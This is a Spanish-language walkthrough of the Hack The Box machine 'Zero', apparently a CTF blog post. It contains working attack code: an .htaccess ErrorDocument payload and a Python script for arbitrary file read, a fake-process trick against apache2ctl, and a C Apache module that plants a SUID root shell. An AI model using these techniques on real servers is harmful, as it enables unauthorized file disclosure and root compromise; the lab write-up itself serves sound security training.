---
layout: single
title: HTB: Zero
excerpt: "Zero es una máquina de Hack The Box centrada en el abuso de Apache y la explotación de configuraciones avanzadas. Aquí te muestro el proceso completo, desde el reconocimiento hasta la obtención de root."
date: 2025-09-21
classes: wide
header:
  teaser: /img/zero-cover.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Apache
  - Exploit
tags:
  - Apache
  - SFTP
  - Privilege Escalation
  - Linux
  - Root
  - CTF
---

<p align="center">
  <img src="/assets/images/htb-Zero/box-zero.webp" alt="Zero" style="height:150px;">
</p>

Zero es una máquina de Hack The Box donde el reto principal es abusar de la configuración de Apache en un entorno de hosting compartido. El objetivo es obtener acceso root explotando la gestión de procesos y la configuración personalizada del servidor web.

## Box Info

| Name | [Zero](https://hackthebox.com/machines/zero) ![Zero](/assets/images/htb-Zero/box-zero.webp) |
|------|:---:|
| Release Date | 12 Aug 2025 |
| Retire Date | 12 Aug 2025 |
| OS | Linux ![Linux](/icons/Linux.png) |
| Base Points | Insane [50] |
| Creator | [jkr](https://app.hackthebox.com/users/77141) |

## Recon

### Escaneo Inicial

```console
nmap -p- -vvv --min-rate 10000 10.129.234.62
nmap -p 22,80 -sCV 10.129.234.62
```

Puertos abiertos: **22/SSH** y **80/HTTP**. El servidor corre Apache 2.4.41 sobre Ubuntu 20.04.

### Sitio Web

El sitio es un proveedor de hosting que permite subir archivos vía SFTP y solo sirve páginas HTML estáticas.

#### SFTP

Se obtiene acceso SFTP con las credenciales generadas en el registro. Dentro del directorio `public_html` se encuentra un archivo `.htaccess` controlado por root y un `index.html`.

#### Prueba de ejecución PHP

Al subir archivos `.php`, el servidor solo muestra el código fuente, no lo ejecuta.

#### Abuso de .htaccess para File Read

Se puede modificar `.htaccess` para leer archivos arbitrarios usando la directiva `ErrorDocument`:

```apache
Header always set X-Zero-Customer 'zro-de834d1c'
ErrorDocument 404 %{file:/etc/passwd}
```

Al solicitar un archivo inexistente, el contenido de `/etc/passwd` se muestra en la respuesta.

#### Script para automatizar File Read

```python
# Script para leer archivos usando el vector de .htaccess
import sys
import paramiko
import requests

if len(sys.argv) != 5:
    print(f"usage: {sys.argv[0]} <host> <username> <password> <file_to_read>")
    sys.exit(1)

host, username, password, target_file = sys.argv[1:5]

def write_file(host, username, password, content):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname=host, port=22, username=username, password=password)
    sftp_client = ssh_client.open_sftp()
    target_path = "public_html/.htaccess"
    sftp_client.remove(target_path)
    with sftp_client.file(target_path, "wb") as remote_file:
        remote_file.write(content)

def read_file(host, username):
    resp = requests.get(f"http://{host}/~{username}/0xdf.whatever")
    assert resp.status_code == 404
    return resp.text

htcontent = f"ErrorDocument 404 %{{file:{target_file}}}".encode()
write_file(host, username, password, htcontent)
print(read_file(host, username))
```

## Escalada de Privilegios

### Enumeración

Al obtener acceso SSH como `zroadmin` (credenciales extraídas de la base de datos), se observa que existen scripts ejecutados por root cada minuto, incluyendo `/usr/local/bin/zro.web-confcheck`.

### Abuso de procesos y apache2ctl

Se puede crear un proceso falso que simule ser Apache con argumentos controlados, y así manipular la ejecución de `apache2ctl` para incluir archivos arbitrarios o cargar módulos maliciosos.

#### Ejemplo de proceso falso en Python

```python
import os
os.execv('/bin/sleep', ['/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c', "223"])
```

#### Ejemplo de módulo malicioso en C

```c
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"

static void myinit(apr_pool_t *p, server_rec *s) {
    system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
}

module AP_MODULE_DECLARE_DATA mymodule = {
    STANDARD20_MODULE_STUFF,
    NULL, NULL, NULL, NULL, NULL, NULL
};

__attribute__((constructor))
static void _init() { myinit(NULL, NULL); }
```

Compilar y cargar este módulo permite obtener una shell root vía bash SUID.

## Conclusión

Zero es una máquina avanzada que explota la gestión de procesos y la configuración de Apache para lograr la escalada de privilegios. El reto principal es la creatividad para abusar de `.htaccess`, procesos y módulos personalizados.

---

**¿Te gustó el writeup?**  
Puedes ver la resolución completa en mi canal de YouTube:  
[Máquina Zero - HackTheBox](https://www.youtube.com/watch?v=wOm4OOBLbys)